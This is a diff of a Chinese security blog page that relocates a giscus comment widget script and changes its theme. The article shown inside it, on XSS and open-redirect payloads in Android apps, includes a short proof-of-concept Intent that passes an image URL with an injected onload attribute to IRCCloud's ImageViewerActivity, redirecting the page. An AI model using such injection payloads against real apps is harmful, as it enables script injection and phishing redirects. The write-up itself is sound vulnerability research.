@@ -204,22 +204,7 @@
     
 
     
-    <!--评论-->
-    <script src="https://giscus.app/client.js"
-        data-repo="tea9/tea9_giscus"
-        data-repo-id="R_kgDOMsAxBg"
-        data-category="Announcements"
-        data-category-id="DIC_kwDOMsAxBs4CiKYB"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="bottom"
-        data-theme="purple_dark"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-    </script>
+
     <article class="post-wrap">
         <header class="post-header">
             <h1 class="post-title">android应用中的xss和开放重定向payload</h1>
@@ -258,6 +243,22 @@
 <p>poc：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">       intent.setClassName(&quot;com.irccloud.android&quot;, &quot;com.irccloud.android.activity.ImageViewerActivity&quot;);</span><br><span class="line">       intent.setData(Uri.parse(&quot;https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg&#x27; onload=&#x27;window.location.href=\&quot;http://yahoo.com\&quot;&quot;));</span><br><span class="line">       startActivity(intent);</span><br></pre></td></tr></table></figure>
         </div>
+ <!--评论-->
+   <script src="https://giscus.app/client.js"
+        data-repo="tea9/tea9_giscus"
+        data-repo-id="R_kgDOMsAxBg"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOMsAxBs4CiKYB"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
 
         
             <section class="post-copyright">
